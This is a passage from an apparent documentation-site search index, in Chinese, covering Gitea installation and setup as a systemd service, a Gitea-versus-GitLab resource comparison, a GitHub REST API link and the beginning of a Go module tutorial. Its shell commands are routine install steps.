\u6d3b\u7684\u7a7a\u95f4\u914d\u989d\u7ba1\u7406\uff0c\u8ba9\u4f01\u4e1a\u5b9e\u73b0\u81ea\u52a8\u6269\u5bb9\uff0c\u65b9\u4fbf\u7684\u89e3\u51b3\u4e86\u4f01\u4e1a\u5728\u9879\u76ee\u5f00\u53d1\u4e2d\u9047\u5230\u7684\u4ed3\u5e93\u5927\u6587\u4ef6\u95ee\u9898\u3002","title":"\u603b\u7ed3"},{"location":"git/git_lfs/#references","text":"Git Large File Storage Git LFS Wiki gitattributes Git LFS \u64cd\u4f5c\u6307\u5357","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"git/gitea/","text":"Gitea \uf0c1 Gitea \u662f\u4e00\u4e2a\u5f00\u6e90\u793e\u533a\u9a71\u52a8\u7684\u8f7b\u91cf\u7ea7\u4ee3\u7801\u6258\u7ba1\u89e3\u51b3\u65b9\u6848\uff0c\u540e\u7aef\u91c7\u7528 Go \u7f16\u5199\uff0c\u91c7\u7528 MIT \u8bb8\u53ef\u8bc1. \u7b80\u4ecb \uf0c1 Gitea \u662f\u4e00\u4e2a\u81ea\u5df1\u6258\u7ba1\u7684Git\u670d\u52a1\u7a0b\u5e8f\u3002\u4ed6\u548cGitHub, Bitbucket or Gitlab\u7b49\u6bd4\u8f83\u7c7b\u4f3c\u3002\u4ed6\u662f\u4ece Gogs \u53d1\u5c55\u800c\u6765\uff0c\u4e0d\u8fc7\u5df2\u7ecfFork\u5e76\u4e14\u547d\u540d\u4e3aGitea\u3002 Gitea\u7684\u9996\u8981\u76ee\u6807\u662f\u521b\u5efa\u4e00\u4e2a\u6781\u6613\u5b89\u88c5\uff0c\u8fd0\u884c\u975e\u5e38\u5feb\u901f\uff0c\u5b89\u88c5\u548c\u4f7f\u7528\u4f53\u9a8c\u826f\u597d\u7684\u81ea\u5efa Git \u670d\u52a1\u3002\u6211\u4eec\u91c7\u7528Go\u4f5c\u4e3a\u540e\u7aef\u8bed\u8a00\uff0c\u8fd9\u4f7f\u6211\u4eec\u53ea\u8981\u751f\u6210\u4e00\u4e2a\u53ef\u6267\u884c\u7a0b\u5e8f\u5373\u53ef\u3002\u5e76\u4e14\u4ed6\u8fd8\u652f\u6301\u8de8\u5e73\u53f0\uff0c\u652f\u6301 Linux, macOS \u548c Windows \u4ee5\u53ca\u5404\u79cd\u67b6\u6784\uff0c\u9664\u4e86x86\uff0camd64\uff0c\u8fd8\u5305\u62ec ARM \u548c PowerPC\u3002 \u529f\u80fd\u7279\u6027 \uf0c1 \u652f\u6301\u6d3b\u52a8\u65f6\u95f4\u7ebf \u652f\u6301 SSH \u4ee5\u53ca HTTP/HTTPS \u534f\u8bae \u652f\u6301 SMTP\u3001LDAP \u548c\u53cd\u5411\u4ee3\u7406\u7684\u7528\u6237\u8ba4\u8bc1 \u652f\u6301\u53cd\u5411\u4ee3\u7406\u5b50\u8def\u5f84 \u652f\u6301\u7528\u6237\u3001\u7ec4\u7ec7\u548c\u4ed3\u5e93\u7ba1\u7406\u7cfb\u7edf \u652f\u6301\u6dfb\u52a0\u548c\u5220\u9664\u4ed3\u5e93\u534f\u4f5c\u8005 \u652f\u6301\u4ed3\u5e93\u548c\u7ec4\u7ec7\u7ea7\u522b Web \u94a9\u5b50\uff08\u5305\u62ec Slack \u96c6\u6210\uff09 \u652f\u6301\u4ed3\u5e93 Git \u94a9\u5b50\u548c\u90e8\u7f72\u5bc6\u94a5 \u652f\u6301\u4ed3\u5e93\u5de5\u5355\uff08Issue\uff09\u3001\u5408\u5e76\u8bf7\u6c42\uff08Pull Request\uff09\u4ee5\u53ca Wiki \u652f\u6301\u8fc1\u79fb\u548c\u955c\u50cf\u4ed3\u5e93\u4ee5\u53ca\u5b83\u7684 Wiki \u652f\u6301\u5728\u7ebf\u7f16\u8f91\u4ed3\u5e93\u6587\u4ef6\u548c Wiki \u652f\u6301\u81ea\u5b9a\u4e49\u6e90\u7684 Gravatar \u548c Federated Avatar \u652f\u6301\u90ae\u4ef6\u670d\u52a1 \u652f\u6301\u540e\u53f0\u7ba1\u7406\u9762\u677f \u652f\u6301 MySQL\u3001PostgreSQL\u3001SQLite3\u3001MSSQL \u548c TiDB(MySQL) \u6570\u636e\u5e93 \u652f\u6301\u591a\u8bed\u8a00\u672c\u5730\u5316\uff0821 \u79cd\u8bed\u8a00\uff09 \u652f\u6301\u8f6f\u4ef6\u5305\u6ce8\u518c\u4e2d\u5fc3\uff08Composer/Conan/Container/Generic/Helm/Maven/NPM/Nuget/PyPI/RubyGems\uff09 \u7cfb\u7edf\u8981\u6c42 \uf0c1 \u6700\u4f4e\u7684\u7cfb\u7edf\u786c\u4ef6\u8981\u6c42\u4e3a\u4e00\u4e2a\u5ec9\u4ef7\u7684\u6811\u8393\u6d3e \u5982\u679c\u7528\u4e8e\u56e2\u961f\u9879\u76ee\uff0c\u5efa\u8bae\u4f7f\u7528 2 \u6838 CPU \u53ca 1GB \u5185\u5b58 \u7ec4\u4ef6 \uf0c1 Web\u6846\u67b6\uff1a Chi ORM: XORM UI \u6846\u67b6\uff1a jQuery Fomantic UI Vue2 \u66f4\u591a\u7ec4\u4ef6\u53c2\u89c1 package.json \u7f16\u8f91\u5668\uff1a CodeMirror EasyMDE Monaco Editor \u6570\u636e\u5e93\u9a71\u52a8\uff1a https://github.com/go-sql-driver/mysql https://github.com/lib/pq https://github.com/mattn/go-sqlite3 https://github.com/denisenkom/go-mssqldb \u8f6f\u4ef6\u53ca\u670d\u52a1\u652f\u6301 \uf0c1 Drone (CI) \u5b89\u88c5 \uf0c1 \u4ece\u4e8c\u8fdb\u5236\u5b89\u88c5 \u6240\u6709\u4e0b\u8f7d\u5747\u5305\u62ec SQLite, MySQL \u548c PostgreSQL \u7684\u652f\u6301\uff0c\u540c\u65f6\u6240\u6709\u8d44\u6e90\u5747\u5df2\u5d4c\u5165\u5230\u53ef\u6267\u884c\u7a0b\u5e8f\u4e2d\uff0c\u8fd9\u4e00\u70b9\u548c\u8001\u7248\u672c\u6709\u6240\u4e0d\u540c\u3002 \u57fa\u4e8e\u4e8c\u8fdb\u5236\u7684\u5b89\u88c5\u975e\u5e38\u7b80\u5355\uff0c\u53ea\u8981\u4ece \u4e0b\u8f7d\u9875\u9762 \u9009\u62e9\u5bf9\u5e94\u5e73\u53f0\uff0c\u62f7\u8d1d\u4e0b\u8f7dURL\uff0c\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\u5373\u53ef\uff08\u4ee5Linux\u4e3a\u4f8b\uff09\uff1a $ wget -O gitea https://dl.gitea.io/gitea/1.16.8/gitea-1.16.8-linux-amd64 $ chmod +x gitea $ mv gitea /usr/local/bin/ \u6d4b\u8bd5 \u5728\u6267\u884c\u4e86\u4ee5\u4e0a\u6b65\u9aa4\u4e4b\u540e\uff0c\u4f60\u5c06\u4f1a\u83b7\u5f97 gitea \u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u5728\u4f60\u590d\u5236\u5230\u90e8\u7f72\u7684\u673a\u5668\u4e4b\u524d\u53ef\u4ee5\u5148\u6d4b\u8bd5\u4e00\u4e0b\u3002\u5728\u547d\u4ee4\u884c\u6267\u884c\u5b8c\u540e\uff0c\u4f60\u53ef\u4ee5 Ctrl + C \u5173\u6389\u7a0b\u5e8f\u3002 $ ./gitea web \u521b\u5efa\u7528\u6237 git \u548c gitea \u76f8\u5e94\u6743\u9650\u7684\u914d\u7f6e\u548c\u5b58\u50a8\u76ee\u5f55\u3002 $ sudo adduser git $ sudo mkdir /var/lib/gitea $ sudo chown git:git /var/lib/gitea/ $ sudo mkdir /etc/gitea $ sudo chown git:git /etc/gitea/ \u4ee5\u670d\u52a1\u65b9\u5f0f\u8fd0\u884c \uf0c1 \u5728 terminal \u4e2d\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\uff1a $ sudo vim /etc/systemd/system/gitea.service \u63a5\u7740\u62f7\u8d1d\u793a\u4f8b\u4ee3\u7801 gitea.service \u5e76\u53d6\u6d88\u5bf9\u4efb\u4f55\u9700\u8981\u8fd0\u884c\u5728\u4e3b\u673a\u4e0a\u7684\u670d\u52a1\u90e8\u5206\u7684\u6ce8\u91ca\uff0c\u8b6c\u5982 MySQL\u3002 \u4fee\u6539 user\uff0chome \u76ee\u5f55\u4ee5\u53ca\u5176\u4ed6\u5fc5\u987b\u7684\u521d\u59cb\u5316\u53c2\u6570\uff0c\u5982\u679c\u4f7f\u7528\u81ea\u5b9a\u4e49\u7aef\u53e3\uff0c\u5219\u9700\u4fee\u6539 PORT \u53c2\u6570\uff0c\u53cd\u4e4b\u5982\u679c\u4f7f\u7528\u9ed8\u8ba4\u7aef\u53e3\u5219\u9700\u5220\u9664 -p \u6807\u8bb0\u3002 \u6fc0\u6d3b gitea \u5e76\u5c06\u5b83\u4f5c\u4e3a\u7cfb\u7edf\u81ea\u542f\u52a8\u670d\u52a1\uff1a $ sudo systemctl enable gitea $ sudo systemctl start gitea GitLab \uf0c1 \u5f00\u59cb\u65f6\u60f3\u81ea\u5efa GitLab \u670d\u52a1\u7684\uff0c\u4f46\u662f GitLab \u5360\u7528\u592a\u591a\u8d44\uff0c\u800cGitea \u8d44\u6e90\u5360\u7528\u660e\u663e\u8981\u4f4e\u5f97\u591a\u3002 \u9759\u6001\u786c\u76d8\u5360\u7528\u4e0a\uff0cGitea \u6838\u5fc3\u662f\u4e00\u4e2a 100 MiB \u4e0a\u4e0b\u7684\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u5916\u52a0\u4e0a\u4f5c\u4e3a\u5fc5\u8981\u4f9d\u8d56\u7684 Git\uff08\u5982\u679c\u5185\u7f6e SQLite \u4e0d\u591f\u7684\u8bdd\u4e5f\u9700\u8981\u5355\u72ec\u90e8\u7f72\u4e00\u4e2a MySQL \u6216\u8005 PostgreSQL \u505a\u6570\u636e\u5e93\uff09\uff0c\u800c GitLab \u5149 Docker image \u5927\u5c0f\u5c31 GiB \u7ea7\u4e86\uff0c\u65ad\u65ad\u7eed\u7eed\u8dd1\u4e86\u4e24\u5929\uff0c\u8fd9\u65e5\u5fd7\u5c31\u5feb 200MiB \u4e86\u2026\u2026 \u5185\u5b58\u65b9\u9762\uff0c\u6211\u8fd9\u91cc Gitea \u65e5\u5e38\u5360\u7528\u5185\u5b58\u901a\u5e38\u5728\u51e0\u767e MiB \u6d6e\u52a8\uff0c\u800c GitLab \u7684 Docker \u5bb9\u5668\u76ee\u524d\u5185\u5b58\u5360\u7528\u662f 14GiB\u3002 GitLab CPU \u5360\u7528\u7387\uff08\u76f8\u5bf9\u4e8e\u4e00\u4e2a\u6838\u5fc3\u8ba1\u7b97\uff09\u65e5\u5e38\u5f85\u673a\u5728 35% \u4e0a\u4e0b\uff0c\u800c Gitea \u901a\u5e38\u662f 0.2% \u5de6\u53f3\u3002\uff08\u8fd9\u4e9b\u90fd\u662f\u4e0d\u4e25\u8c28\u7684\u7b80\u5355\u6d4b\u8bd5\uff0c\u73b0\u5728\u5df2\u7ecf\u6539\u7528 Gitea\uff0c\u61d2\u5f97\u6298\u817e\u4e86\u3002\uff09 https://docs.gitlab.com/ee/update/package/#upgrade-using-a-manually-downloaded-package https://packages.gitlab.com/gitlab/gitlab-ce https://www.jb51.net/article/194092.htm https://zhuanlan.zhihu.com/p/486410391 \u53c2\u8003\u8d44\u6599 \uf0c1 Gitea Docs","title":"Gitea"},{"location":"git/gitea/#gitea","text":"Gitea \u662f\u4e00\u4e2a\u5f00\u6e90\u793e\u533a\u9a71\u52a8\u7684\u8f7b\u91cf\u7ea7\u4ee3\u7801\u6258\u7ba1\u89e3\u51b3\u65b9\u6848\uff0c\u540e\u7aef\u91c7\u7528 Go \u7f16\u5199\uff0c\u91c7\u7528 MIT \u8bb8\u53ef\u8bc1.","title":"Gitea"},{"location":"git/gitea/#introduction","text":"Gitea \u662f\u4e00\u4e2a\u81ea\u5df1\u6258\u7ba1\u7684Git\u670d\u52a1\u7a0b\u5e8f\u3002\u4ed6\u548cGitHub, Bitbucket or Gitlab\u7b49\u6bd4\u8f83\u7c7b\u4f3c\u3002\u4ed6\u662f\u4ece Gogs \u53d1\u5c55\u800c\u6765\uff0c\u4e0d\u8fc7\u5df2\u7ecfFork\u5e76\u4e14\u547d\u540d\u4e3aGitea\u3002 Gitea\u7684\u9996\u8981\u76ee\u6807\u662f\u521b\u5efa\u4e00\u4e2a\u6781\u6613\u5b89\u88c5\uff0c\u8fd0\u884c\u975e\u5e38\u5feb\u901f\uff0c\u5b89\u88c5\u548c\u4f7f\u7528\u4f53\u9a8c\u826f\u597d\u7684\u81ea\u5efa Git \u670d\u52a1\u3002\u6211\u4eec\u91c7\u7528Go\u4f5c\u4e3a\u540e\u7aef\u8bed\u8a00\uff0c\u8fd9\u4f7f\u6211\u4eec\u53ea\u8981\u751f\u6210\u4e00\u4e2a\u53ef\u6267\u884c\u7a0b\u5e8f\u5373\u53ef\u3002\u5e76\u4e14\u4ed6\u8fd8\u652f\u6301\u8de8\u5e73\u53f0\uff0c\u652f\u6301 Linux, macOS \u548c Windows \u4ee5\u53ca\u5404\u79cd\u67b6\u6784\uff0c\u9664\u4e86x86\uff0camd64\uff0c\u8fd8\u5305\u62ec ARM \u548c PowerPC\u3002","title":"\u7b80\u4ecb"},{"location":"git/gitea/#features","text":"\u652f\u6301\u6d3b\u52a8\u65f6\u95f4\u7ebf \u652f\u6301 SSH \u4ee5\u53ca HTTP/HTTPS \u534f\u8bae \u652f\u6301 SMTP\u3001LDAP \u548c\u53cd\u5411\u4ee3\u7406\u7684\u7528\u6237\u8ba4\u8bc1 \u652f\u6301\u53cd\u5411\u4ee3\u7406\u5b50\u8def\u5f84 \u652f\u6301\u7528\u6237\u3001\u7ec4\u7ec7\u548c\u4ed3\u5e93\u7ba1\u7406\u7cfb\u7edf \u652f\u6301\u6dfb\u52a0\u548c\u5220\u9664\u4ed3\u5e93\u534f\u4f5c\u8005 \u652f\u6301\u4ed3\u5e93\u548c\u7ec4\u7ec7\u7ea7\u522b Web \u94a9\u5b50\uff08\u5305\u62ec Slack \u96c6\u6210\uff09 \u652f\u6301\u4ed3\u5e93 Git \u94a9\u5b50\u548c\u90e8\u7f72\u5bc6\u94a5 \u652f\u6301\u4ed3\u5e93\u5de5\u5355\uff08Issue\uff09\u3001\u5408\u5e76\u8bf7\u6c42\uff08Pull Request\uff09\u4ee5\u53ca Wiki \u652f\u6301\u8fc1\u79fb\u548c\u955c\u50cf\u4ed3\u5e93\u4ee5\u53ca\u5b83\u7684 Wiki \u652f\u6301\u5728\u7ebf\u7f16\u8f91\u4ed3\u5e93\u6587\u4ef6\u548c Wiki \u652f\u6301\u81ea\u5b9a\u4e49\u6e90\u7684 Gravatar \u548c Federated Avatar \u652f\u6301\u90ae\u4ef6\u670d\u52a1 \u652f\u6301\u540e\u53f0\u7ba1\u7406\u9762\u677f \u652f\u6301 MySQL\u3001PostgreSQL\u3001SQLite3\u3001MSSQL \u548c TiDB(MySQL) \u6570\u636e\u5e93 \u652f\u6301\u591a\u8bed\u8a00\u672c\u5730\u5316\uff0821 \u79cd\u8bed\u8a00\uff09 \u652f\u6301\u8f6f\u4ef6\u5305\u6ce8\u518c\u4e2d\u5fc3\uff08Composer/Conan/Container/Generic/Helm/Maven/NPM/Nuget/PyPI/RubyGems\uff09","title":"\u529f\u80fd\u7279\u6027"},{"location":"git/gitea/#system-requirements","text":"\u6700\u4f4e\u7684\u7cfb\u7edf\u786c\u4ef6\u8981\u6c42\u4e3a\u4e00\u4e2a\u5ec9\u4ef7\u7684\u6811\u8393\u6d3e \u5982\u679c\u7528\u4e8e\u56e2\u961f\u9879\u76ee\uff0c\u5efa\u8bae\u4f7f\u7528 2 \u6838 CPU \u53ca 1GB \u5185\u5b58","title":"\u7cfb\u7edf\u8981\u6c42"},{"location":"git/gitea/#components","text":"Web\u6846\u67b6\uff1a Chi ORM: XORM UI \u6846\u67b6\uff1a jQuery Fomantic UI Vue2 \u66f4\u591a\u7ec4\u4ef6\u53c2\u89c1 package.json \u7f16\u8f91\u5668\uff1a CodeMirror EasyMDE Monaco Editor \u6570\u636e\u5e93\u9a71\u52a8\uff1a https://github.com/go-sql-driver/mysql https://github.com/lib/pq https://github.com/mattn/go-sqlite3 https://github.com/denisenkom/go-mssqldb","title":"\u7ec4\u4ef6"},{"location":"git/gitea/#service-support","text":"Drone (CI)","title":"\u8f6f\u4ef6\u53ca\u670d\u52a1\u652f\u6301"},{"location":"git/gitea/#install","text":"\u4ece\u4e8c\u8fdb\u5236\u5b89\u88c5 \u6240\u6709\u4e0b\u8f7d\u5747\u5305\u62ec SQLite, MySQL \u548c PostgreSQL \u7684\u652f\u6301\uff0c\u540c\u65f6\u6240\u6709\u8d44\u6e90\u5747\u5df2\u5d4c\u5165\u5230\u53ef\u6267\u884c\u7a0b\u5e8f\u4e2d\uff0c\u8fd9\u4e00\u70b9\u548c\u8001\u7248\u672c\u6709\u6240\u4e0d\u540c\u3002 \u57fa\u4e8e\u4e8c\u8fdb\u5236\u7684\u5b89\u88c5\u975e\u5e38\u7b80\u5355\uff0c\u53ea\u8981\u4ece \u4e0b\u8f7d\u9875\u9762 \u9009\u62e9\u5bf9\u5e94\u5e73\u53f0\uff0c\u62f7\u8d1d\u4e0b\u8f7dURL\uff0c\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\u5373\u53ef\uff08\u4ee5Linux\u4e3a\u4f8b\uff09\uff1a $ wget -O gitea https://dl.gitea.io/gitea/1.16.8/gitea-1.16.8-linux-amd64 $ chmod +x gitea $ mv gitea /usr/local/bin/ \u6d4b\u8bd5 \u5728\u6267\u884c\u4e86\u4ee5\u4e0a\u6b65\u9aa4\u4e4b\u540e\uff0c\u4f60\u5c06\u4f1a\u83b7\u5f97 gitea \u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u5728\u4f60\u590d\u5236\u5230\u90e8\u7f72\u7684\u673a\u5668\u4e4b\u524d\u53ef\u4ee5\u5148\u6d4b\u8bd5\u4e00\u4e0b\u3002\u5728\u547d\u4ee4\u884c\u6267\u884c\u5b8c\u540e\uff0c\u4f60\u53ef\u4ee5 Ctrl + C \u5173\u6389\u7a0b\u5e8f\u3002 $ ./gitea web \u521b\u5efa\u7528\u6237 git \u548c gitea \u76f8\u5e94\u6743\u9650\u7684\u914d\u7f6e\u548c\u5b58\u50a8\u76ee\u5f55\u3002 $ sudo adduser git $ sudo mkdir /var/lib/gitea $ sudo chown git:git /var/lib/gitea/ $ sudo mkdir /etc/gitea $ sudo chown git:git /etc/gitea/","title":"\u5b89\u88c5"},{"location":"git/gitea/#service","text":"\u5728 terminal \u4e2d\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\uff1a $ sudo vim /etc/systemd/system/gitea.service \u63a5\u7740\u62f7\u8d1d\u793a\u4f8b\u4ee3\u7801 gitea.service \u5e76\u53d6\u6d88\u5bf9\u4efb\u4f55\u9700\u8981\u8fd0\u884c\u5728\u4e3b\u673a\u4e0a\u7684\u670d\u52a1\u90e8\u5206\u7684\u6ce8\u91ca\uff0c\u8b6c\u5982 MySQL\u3002 \u4fee\u6539 user\uff0chome \u76ee\u5f55\u4ee5\u53ca\u5176\u4ed6\u5fc5\u987b\u7684\u521d\u59cb\u5316\u53c2\u6570\uff0c\u5982\u679c\u4f7f\u7528\u81ea\u5b9a\u4e49\u7aef\u53e3\uff0c\u5219\u9700\u4fee\u6539 PORT \u53c2\u6570\uff0c\u53cd\u4e4b\u5982\u679c\u4f7f\u7528\u9ed8\u8ba4\u7aef\u53e3\u5219\u9700\u5220\u9664 -p \u6807\u8bb0\u3002 \u6fc0\u6d3b gitea \u5e76\u5c06\u5b83\u4f5c\u4e3a\u7cfb\u7edf\u81ea\u542f\u52a8\u670d\u52a1\uff1a $ sudo systemctl enable gitea $ sudo systemctl start gitea","title":"\u4ee5\u670d\u52a1\u65b9\u5f0f\u8fd0\u884c"},{"location":"git/gitea/#gitlab","text":"\u5f00\u59cb\u65f6\u60f3\u81ea\u5efa GitLab \u670d\u52a1\u7684\uff0c\u4f46\u662f GitLab \u5360\u7528\u592a\u591a\u8d44\uff0c\u800cGitea \u8d44\u6e90\u5360\u7528\u660e\u663e\u8981\u4f4e\u5f97\u591a\u3002 \u9759\u6001\u786c\u76d8\u5360\u7528\u4e0a\uff0cGitea \u6838\u5fc3\u662f\u4e00\u4e2a 100 MiB \u4e0a\u4e0b\u7684\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u5916\u52a0\u4e0a\u4f5c\u4e3a\u5fc5\u8981\u4f9d\u8d56\u7684 Git\uff08\u5982\u679c\u5185\u7f6e SQLite \u4e0d\u591f\u7684\u8bdd\u4e5f\u9700\u8981\u5355\u72ec\u90e8\u7f72\u4e00\u4e2a MySQL \u6216\u8005 PostgreSQL \u505a\u6570\u636e\u5e93\uff09\uff0c\u800c GitLab \u5149 Docker image \u5927\u5c0f\u5c31 GiB \u7ea7\u4e86\uff0c\u65ad\u65ad\u7eed\u7eed\u8dd1\u4e86\u4e24\u5929\uff0c\u8fd9\u65e5\u5fd7\u5c31\u5feb 200MiB \u4e86\u2026\u2026 \u5185\u5b58\u65b9\u9762\uff0c\u6211\u8fd9\u91cc Gitea \u65e5\u5e38\u5360\u7528\u5185\u5b58\u901a\u5e38\u5728\u51e0\u767e MiB \u6d6e\u52a8\uff0c\u800c GitLab \u7684 Docker \u5bb9\u5668\u76ee\u524d\u5185\u5b58\u5360\u7528\u662f 14GiB\u3002 GitLab CPU \u5360\u7528\u7387\uff08\u76f8\u5bf9\u4e8e\u4e00\u4e2a\u6838\u5fc3\u8ba1\u7b97\uff09\u65e5\u5e38\u5f85\u673a\u5728 35% \u4e0a\u4e0b\uff0c\u800c Gitea \u901a\u5e38\u662f 0.2% \u5de6\u53f3\u3002\uff08\u8fd9\u4e9b\u90fd\u662f\u4e0d\u4e25\u8c28\u7684\u7b80\u5355\u6d4b\u8bd5\uff0c\u73b0\u5728\u5df2\u7ecf\u6539\u7528 Gitea\uff0c\u61d2\u5f97\u6298\u817e\u4e86\u3002\uff09 https://docs.gitlab.com/ee/update/package/#upgrade-using-a-manually-downloaded-package https://packages.gitlab.com/gitlab/gitlab-ce https://www.jb51.net/article/194092.htm https://zhuanlan.zhihu.com/p/486410391","title":"GitLab"},{"location":"git/gitea/#references","text":"Gitea Docs","title":"\u53c2\u8003\u8d44\u6599"},{"location":"git/github_rest_api/","text":"GitHub REST API \uf0c1 \u8981\u521b\u5efa\u96c6\u6210\u3001\u68c0\u7d22\u6570\u636e\u548c\u81ea\u52a8\u5316\u60a8\u7684\u5de5\u4f5c\u6d41\u7a0b\uff0c\u8bf7\u4f7f\u7528 GitHub REST API \u8fdb\u884c\u6784\u5efa\u3002 Get the latest release \uf0c1 https://docs.github.com/en/rest/releases/releases#get-the-latest-release","title":"GitHub REST API"},{"location":"git/github_rest_api/#github-rest-api","text":"\u8981\u521b\u5efa\u96c6\u6210\u3001\u68c0\u7d22\u6570\u636e\u548c\u81ea\u52a8\u5316\u60a8\u7684\u5de5\u4f5c\u6d41\u7a0b\uff0c\u8bf7\u4f7f\u7528 GitHub REST API \u8fdb\u884c\u6784\u5efa\u3002","title":"GitHub REST API"},{"location":"git/github_rest_api/#get-the-latest-release","text":"https://docs.github.com/en/rest/releases/releases#get-the-latest-release","title":"Get the latest release"},{"location":"go/create_module/","text":"\u521b\u5efa Go \u6a21\u5757 \uf0c1 \u4ecb\u7ecd\u6a21\u5757\u3001\u51fd\u6570\u3001\u9519\u8bef\u5904\u7406\u3001\u6570\u7ec4\u3001map\u3001\u5355\u5143\u6d4b\u8bd5\u548c\u7f16\u8bd1\u5b89\u88c5. \u521b\u5efa\u4e00\u4e2a\u5176\u4ed6\u4eba\u53ef\u4ee5\u4f7f\u7528\u7684\u6a21\u5757 \uf0c1 \u5728\u4e00\u4e2a\u6a21\u5757\u4e2d\uff0c\u60a8\u4e3a\u4e00\u7ec4\u79bb\u6563\u4e14\u6709\u7528\u7684\u529f\u80fd\u6536\u96c6\u4e00\u4e2a\u6216\u591a\u4e2a\u76f8\u5173\u5305\u3002\u4f8b\u5982\uff0c\u60a8\u53ef\u80fd\u4f1a\u521b\u5efa\u4e00\u4e2a\u5305\u542b\u5177\u6709\u8d22\u52a1\u5206\u6790\u529f\u80fd\u7684\u5305\u7684\u6a21\u5757\uff0c\u4ee5\u4fbf\u5176\u4ed6\u7f16\u5199\u8d22\u52a1\u5e94\u7528\u7a0b\u5e8f\u7684\u4eba\u53ef\u4ee5\u4f7f\u7528\u60a8\u7684\u5de5\u4f5c\u3002\u6709\u5173\u5f00\u53d1\u6a21\u5757\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 \u5f00\u53d1\u548c\u53d1\u5e03\u6a21\u5757 \u3002 Go \u4ee3\u7801\u88ab\u5206\u7ec4\u5230\u5305\u4e2d\uff0c\u5305\u88ab\u5206\u7ec4\u5230\u6a21\u5757\u4e2d\u3002\u60a8\u7684\u6a21\u5757\u6307\u5b9a\u4e86\u8fd0\u884c\u4ee3\u7801\u6240\u9700\u7684\u4f9d\u8d56\u9879\uff0c\u5305\u62ec Go \u7248\u672c\u548c\u5b83\u6240\u9700\u7684\u4e00\u7ec4\u5176\u4ed6\u6a21\u5757\u3002 \u4e3a Go \u6a21\u5757\u4ee3\u7801\u521b\u5efa\u4e00\u4e2a\u76ee\u5f55 greetings \u3002 mkdir greetings cd greetings \u4f7f\u7528 \u547d\u4ee4 go mod init \u542f\u52a8\u60a8\u7684\u6a21\u5757 \u3002 \u8fd0\u884c go mod init \u547d\u4ee4\uff0c\u4f1a\u751f\u6210\u4f60\u7684\u6a21\u5757\u8def\u5f84\u2014\u2014 example.com/greetings . \u5982\u679c\u60a8\u53d1\u5e03\u4e00\u4e2a\u6a21\u5757\uff0c\u8fd9\u5fc5\u987b\u662f Go \u5de5\u5177\u53ef\u4ee5\u4ece\u4e2d\u4e0b\u8f7d\u60a8\u7684\u6a21\u5757\u7684\u8def\u5f84\u3002\u90a3\u5c06\u662f\u60a8\u7684\u4ee3\u7801\u5b58\u50a8\u5e93\u3002 \u6709\u5173\u4f7f\u7528\u6a21\u5757\u8def\u5f84\u547d\u540d\u6a21\u5757\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 \u7ba1\u7406\u4f9d\u8d56\u9879 \u3002 $ go mod init example.com/greetings go: creating new go.mod: module example.com/greetings \u521b\u5efa\u4ee3\u7801\u6587\u4ef6 greetings.go\uff0c\u7c98\u8d34\u4ee5\u4e0b\u4ee3\u7801\u5e76\u4fdd\u5b58\u6587\u4ef6\u3002 package greetings import \"fmt\" // Hello returns a greeting for the named person. func Hello(name string) string { // Return a greeting that embeds the name in a message. message := fmt.Sprintf(\"Hi, %v. Welcome!\", name) return message } \u8fd9\u662f\u60a8\u7684\u6a21\u5757\u7684\u7b2c\u4e00\u4e2a\u4ee3\u7801\u3002\u5b83\u4f1a\u5411\u4efb\u4f55\u8bf7\u6c42\u7684\u547c\u53eb\u8005\u8fd4\u56de\u95ee\u5019\u8bed\u3002\u5728\u6b64\u4ee3\u7801\u4e2d\uff0c\u60a8\uff1a \u58f0\u660e\u4e00\u4e2a greetings \u5305\u6765\u6536\u96c6\u76f8\u5173\u529f\u80fd\u3002 \u5b9e\u73b0\u4e00\u4e2a Hello \u51fd\u6570\u6765\u8fd4\u56de\u95ee\u5019\u8bed\u3002 \u8be5\u51fd\u6570\u63a5\u53d7\u4e00\u4e2a\u7c7b\u578b\u4e3a string \u7684\u53c2\u6570 name \u3002\u8be5\u51fd\u6570\u8fd8\u8fd4\u56de\u4e00\u4e2a string . \u5728 Go \u4e2d\uff0c \u540d\u79f0\u4ee5\u5927\u5199\u5b57\u6bcd\u5f00\u5934\u7684\u51fd\u6570\u53ef\u4ee5\u88ab\u4e0d\u5728\u540c\u4e00\u4e2a\u5305\u4e2d\u7684\u51fd\u6570\u8c03\u7528 \u3002\u8fd9\u5728 Go \u4e2d\u79f0\u4e3a\u5bfc\u51fa\u540d\u79f0\u3002\u6709\u5173\u5bfc\u51fa\u540d\u79f0\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 Go tour \u4e2d\u7684 \u5bfc\u51fa\u540d\u79f0 \u3002 \u58f0\u660e\u4e00\u4e2a message \u53d8\u91cf\u6765\u4fdd\u5b58\u4f60\u7684\u95ee\u5019\u3002 \u5728 Go \u4e2d\uff0c := \u8fd0\u7b97\u7b26\u662f\u5728\u4e00\u884c\u4e2d\u58f0\u660e\u548c\u521d\u59cb\u5316\u53d8\u91cf\u7684\u5feb\u6377\u65b9\u5f0f\uff08Go \u4f7f\u7528\u53f3\u4fa7\u7684\u503c\u6765\u786e\u5b9a\u53d8\u91cf\u7684\u7c7b\u578b\uff09\u3002\u4ece\u957f\u8fdc\u6765\u770b\uff0c\u60a8\u53ef\u80fd\u5df2\u5c06\u5176\u5199\u4e3a\uff1a var message string message = fmt.Sprintf(\"Hi, %v. Welcome!\", name) \u4f7f\u7528 fmt \u5305\u7684 Sprintf \u529f\u80fd \u6765\u521b\u5efa\u95ee\u5019\u6d88\u606f\u3002\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u683c\u5f0f\u5b57\u7b26\u4e32\uff0c Sprintf \u5c06\u53c2\u6570 name \u7684\u503c\u66ff\u6362\u4e3a\u683c\u5f0f\u52a8\u8bcd %v \u3002\u63d2\u5165\u53c2\u6570 name \u7684\u503c\u5b8c\u6210\u4e86\u95ee\u5019\u6587\u672c\u3002 